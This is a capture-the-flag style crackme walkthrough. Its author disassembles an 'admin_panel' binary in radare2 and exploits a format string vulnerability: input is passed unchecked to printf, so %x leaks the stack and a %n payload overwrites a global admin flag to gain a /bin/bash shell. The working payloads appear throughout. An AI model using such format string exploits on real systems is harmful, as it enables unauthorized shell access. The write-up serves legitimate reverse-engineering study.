@@ -1,0 +1,191 @@
+Goal: "get a shell! No library tricks."
+
+Step 1: Gather information
+
+>>>>
+$ file admin_panel 
+admin_panel: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 
+interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f17e4897d4526797d28fa3e2427b15faa9a65b9, for GNU/Linux 3.2.0, not stripped
+// ok, so we know we're working with a PIE executable
+<<<<
+
+>>>>
+$ objdump -t admin_panel
+admin_panel:     file format elf64-x86-64
+
+SYMBOL TABLE:
+8< --snip most of this is not helpful for this crackme -- >8
+// oh there's a global uninitialized variable called admin. I wonder what this could possible do... 
+000000000000407c g     O .bss   0000000000000004              admin
+// printf...no surprise that this is here. 
+0000000000000000       F *UND*  0000000000000000              printf@@GLIBC_2.2.5
+// fgets...does this use a file or something?
+0000000000000000       F *UND*  0000000000000000              fgets@@GLIBC_2.2.5
+// strcmp? I doubt we're going for a buffer overflow since it's an easy level and a PIE binary, but, who knows...
+0000000000000000       F *UND*  0000000000000000              strcmp@@GLIBC_2.2.5
+8< --snip most of this is not helpful for this crackme -- >8
+<<<<
+
+>>>>
+// Lets check out what's going on with radare2
+$ r2 -d -AAAA -e dbg.profile=profile.rr2 -d ./admin_panel
+....
+[0x7f49ae03a100]> dcu main
+[0x564968d071a9]> pdfs @ main
+;-- rax:
+;-- rip:
+0x564968d071e5 call sym.imp.strcpy
+0x564968d071ea "Welcome to the admin panel! The program which admins can\ninteract with on a guest computer to do admin stuff!\n"
+0x564968d071f1 call sym.imp.puts
+0x564968d071f6:
+0x564968d07201 cjmp 0x564968d0720f // hey wait a second...
+0x564968d07203 "status: (admin=false; shell=unavailable)\n"
+0x564968d0720a call sym.imp.puts
+0x564968d0720f:
+0x564968d0721a cjmp 0x564968d07228 // this looks like it might be important. Lets check this out in the next step.
+0x564968d0721c "status: (admin=true; shell=available)\n"
+0x564968d07223 call sym.imp.puts
+0x564968d07228:
+0x564968d07228 "*> "                                                                                                                                                       
+0x564968d07234 call sym.imp.printf
+0x564968d0724f call sym.imp.fgets
+0x564968d07257 cjmp 0x564968d072e8
+0x564968d07273 call sym.imp.strtok
+0x564968d0727f "shell"
+0x564968d07289 call sym.imp.strcmp
+0x564968d07290 cjmp 0x564968d072b2 // we should probably find out what's going on here too
+0x564968d0729d cjmp 0x564968d072b2
+0x564968d0729f "/bin/bash"
+0x564968d072ab call sym.imp.system
+0x564968d072b0 jmp 0x564968d072e3
+0x564968d072b2:
+0x564968d072b2 "input: " // Its just a printf, right? No big deal, I'm sure.
+0x564968d072be call sym.imp.printf
+0x564968d072d2 call sym.imp.printf
+0x564968d072de call sym.imp.puts
+0x564968d072e3:
+0x564968d072e3 jmp 0x564968d071f6                                                                                                                                          
+0x564968d072e8:
+0x564968d072fb cjmp 0x564968d07302                                                                                                                                         
+0x564968d072fd call sym.imp.__stack_chk_fail
+<<<<
+
+>>>>
+[0x564968d071a9]> pd 20 @ 0x564968d071f6
+|           ; CODE XREF from main (0x564968d072e3)
+|           0x564968d071f6      8b05802e0000   mov eax, dword [0x564968d0a07c] ; [0x564968d0a07c:4]=0
+|           0x564968d071fc      3d9a0e0000     cmp eax, 0xe9a          ; 3738 // oh that's all we need to do? Get 0xe9a into memory?
+|       ,=< 0x564968d07201      740c           je 0x564968d0720f
+|       |   0x564968d07203      488d3d6e0e00.  lea rdi, qword [0x564968d08078] ; "status: (admin=false; shell=unavailable)\n"
+|       |   0x564968d0720a      e831feffff     call sym.imp.puts       ; int puts(const char *s)
+|       `-> 0x564968d0720f      8b05672e0000   mov eax, dword [0x564968d0a07c] ; [0x564968d0a07c:4]=0
+|           0x564968d07215      3d9a0e0000     cmp eax, 0xe9a          ; 3738
+|       ,=< 0x564968d0721a      750c           jne 0x564968d07228
+// ok, well I'm sure there's an easy way to do this, like entering 3738?
+8< snip >8
+<<<<
+
+Step 2: Try, try, and fail.
+>>>>
+Welcome to the admin panel! The program which admins can
+interact with on a guest computer to do admin stuff!
+
+status: (admin=false; shell=unavailable)
+
+*> 3738
+input: 3738
+
+status: (admin=false; shell=unavailable)
+
+<<<< // shit.
+
+Step 3: OOD, AAAA, VV. It's not as easy as it seemed....
+>>>>
+//lets take a closer look at the input and what happens with it
+.-------------------------------------------------.
+| 8< snip >8                                      |
+| 0x55ec33102228                                  |
+| mov rdx, qword [0x55ec33105070]                 |                                                                             
+| lea rax, qword [local_110h]                     |                                                                             
+| ; 256                                           |                                                                             
+| mov esi, 0x100                                  |                                                                             
+| mov rdi, rax                                    |                                                                             
+| ; char *fgets(char *s, int size, FILE *stream)  | // ok so our input is going into local_110h, limited to 100 bytes                                                                             
+| call sym.imp.fgets;[gj]                         |
+| 8< snip >8                                      |
+`-------------------------------------------------'
+//lets look at where that input goes
+.-------------------------------------.                                                                               
+|  0x55ec331022b2 [gn]                |                                                                               
+| ; "input: "                         |                                                                               
+| lea rdi, qword [0x55ec331030e5]     |                                                                               
+| mov eax, 0                          |                                                                               
+| ; int printf(const char *format)    |                                                                               
+| call sym.imp.printf;[gi]            |                                                                               
+| lea rax, qword [local_110h]         |// ok, here's local_110h again, loaded into rax                                                                               
+| mov rdi, rax                        |// then rdi                                                                           
+| mov eax, 0                          |// wait...doesn't printf return the number of bytes written into eax?                                                                    
+| ; int printf(const char *format)    |                                                                               
+| call sym.imp.printf;[gi]            |// wat. they're just going to display whatever we give them directly?                                                                               
+| ; "\n"                              |                                                                               
+| lea rdi, qword [0x55ec331030d3]     |                                                                               
+| ; int puts(const char *s)           |                                                                               
+| call sym.imp.puts;[gb]              |                                                                               
+`-------------------------------------'  
+<<<<
+Step 4: Try, try again.
+(I had to restart Radare2. The IO for admin_panel is redirected to another tty...we're looking for 0x5653dda7907c now instead of 0x564968d0a07c. Thanks, PIE and ASLR, for keeping us safe at night.)
+
+Welcome to the admin panel! The program which admins can
+interact with on a guest computer to do admin stuff!
+
+status: (admin=false; shell=unavailable)
+
+*> STEP4.%x.%x.%x 
+input: STEP4.75706e69.0.0 // yes, they will display whatever we give them, directly. I wonder if we can find 0x5653dda7907c the stack....
+
+[0x5653dda761a9]> db 0x5653dda762de // this is the instruction after the printf. We're going to find stop here and examine the stack
+....
+status: (admin=false; shell=unavailable)
+
+*> %8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x
+....
+[0x5653dda762de]> x rbp-rsp+0xf @ rsp-0xf
+- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x7ffcb7bc74a1  76bc b7fc 7f00 00d7 62a7 dd53 5600 0000  v.......b..SV...                                                                                                                               
+0x7ffcb7bc74b1  0000 0000 0000 007c 90a7 dd53 5600 0000  .......|...SV...// look closely. 7c90a7dd53 - this is our goal. It's on the stack
+0x7ffcb7bc74c1  0000 0000 0000 0000 0000 0000 0000 0025  ...............%
+0x7ffcb7bc74d1  3878 2e25 3878 2e25 3878 2e25 3878 2e25  8x.%8x.%8x.%8x.%
+0x7ffcb7bc74e1  3878 2e25 3878 2e25 3878 2e25 3878 2e25  8x.%8x.%8x.%8x.%
+0x7ffcb7bc74f1  3878 2e25 3878 2e25 3878 2e25 3878 2e25  8x.%8x.%8x.%8x.%
+0x7ffcb7bc7501  3878 2e25 3878 2e25 3878 2e25 3878 2e25  8x.%8x.%8x.%8x.%
+0x7ffcb7bc7511  3878 2e25 3878 0000 0000 0000 0000 00ff  8x.%8x..........
+
+[0x5653dda762de]> dc
+
+input: 75706e69.       0.       0.dda770d0.       7.       0.dda7907c.       0.       0.2e783825.2e783825.2e783825.2e783825.2e783825.2e783825.2e783825.2e783825.2e783825
+
+Here we see dda7907c in the 7th position. Lets try to exploit this.
+
+*>%3737u%x%x%x%x%x%x%n
+Segmentation Fault (core dumped)
+whoops...restart radare2. We're looking for 0x55a019f1b07c now
+
+*> %3737u.%8x.%8x.%8x.%8x.%8x.%n
+no segfault...whats going on? What did I just write to?
+
+0x55a019f181f6]> dcu 0x55a019f181fc // you need to break at the first comparision to eax and e9a.
+Continue until 0x55a019f181fc using 1 bpsize
+hit breakpoint at: 55a019f181fc
+[0x55a019f181f6]> dr
+rax = 0x00000eca // oh my.
+
+8< ...some math later (0xeca=3786. We need 0xe9a.) >8
+Step3: Apply elite arithmetic skills and get a shell
+*> %3692u.%8x.%8x.%8x.%8x.%8x.%n
+status: (admin=true; shell=available)
+*> shell // this is found through Radare2 visual mode. It's in the code as a plaintext string, given as an argument to strcmp.
+
+So it really wasn't a buffer overflow at all.
+
+
